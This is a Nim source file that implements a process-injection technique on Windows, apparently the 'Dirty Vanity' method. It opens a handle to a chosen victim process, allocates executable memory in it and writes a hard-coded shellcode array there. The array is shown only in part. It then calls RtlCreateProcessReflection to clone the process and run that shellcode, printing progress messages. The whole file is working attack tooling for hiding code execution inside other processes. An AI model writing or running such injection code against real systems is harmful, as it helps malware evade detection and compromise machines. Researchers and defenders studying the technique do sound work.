import strformat, winim, parseopt, strutils
import DirtyVanityHeader

proc main(processID: int)=
    var shellcode: array[3378, byte] = [
    byte 0x40, 0x55, 0x57, 0x48, 0x81, 0xEC, 0xB8, 0x03, 0x00, 0x00, 
    ...
    var victimPid = processID
    var victimHandle: HANDLE = OpenProcess(PROCESS_VM_OPERATION or PROCESS_VM_WRITE or PROCESS_CREATE_THREAD or PROCESS_DUP_HANDLE, TRUE, victimPid.DWORD)
    if (victimHandle == 0.HMODULE):
        echo fmt"[-] Error using OpenProcess on PID {victimPid}: ERROR: ", GetLastError()
        quit(1)

    echo fmt"[+] Got a handle to PID {victimPid}  succesfuly" 

    ## allocate shellcode within victim
    var shellcodeSize = shellcode.len

    var baseAddress: LPVOID = VirtualAllocEx(victimHandle, nil, shellcodeSize, MEM_COMMIT or MEM_RESERVE, PAGE_EXECUTE_READWRITE)
    if (baseAddress == nil):
        echo fmt"[-] Error allocating shellcode with VirtualAllocEx on PID {victimPid}: ERROR: ", GetLastError()
        quit(1)

    echo "[+] Allocated space for shellcode in start address 0x", toHex(cast[uint](baseAddress))

    ##write shellcode
    var status: bool = WriteProcessMemory(victimHandle, baseAddress, addr shellcode[0], len(shellcode), cast[ptr SIZE_T](nil))
    if (status == FALSE):
        echo (fmt"[-] Error writing shellcode with WriteProcessMemory on Explorer.exe : ERROR: ", GetLastError()) 
        quit(1)

    echo "[+] Succesfuly wrote shellcode to victim. about to start the Mirroring" 

    var lib: HMODULE = LoadLibraryA("ntdll.dll")
    if (lib == 0.HMODULE):
        quit(1)

    var RtlCreateProcessReflection = cast[RtlCreateProcessReflectionFunc](GetProcAddress(lib, "RtlCreateProcessReflection".cstring))
    if (RtlCreateProcessReflection == NULL):
        quit(1)

    var info: T_RTLP_PROCESS_REFLECTION_REFLECTION_INFORMATION 
    let flags: ULONG = RTL_CLONE_PROCESS_FLAGS_INHERIT_HANDLES or RTL_CLONE_PROCESS_FLAGS_NO_SYNCHRONIZE
    
    var reflectRet: NTSTATUS = RtlCreateProcessReflection(victimHandle, flags, baseAddress, cast[PVOID](nil) , 0, info)
    if (reflectRet == STATUS_SUCCESS): 
        echo "[+] Succesfully Mirrored to new PID: " ,cast[DWORD](info.ReflectionClientId.UniqueProcess)
    else: 
        echo "[!] Error Mirroring: ERROR " ,GetLastError() 
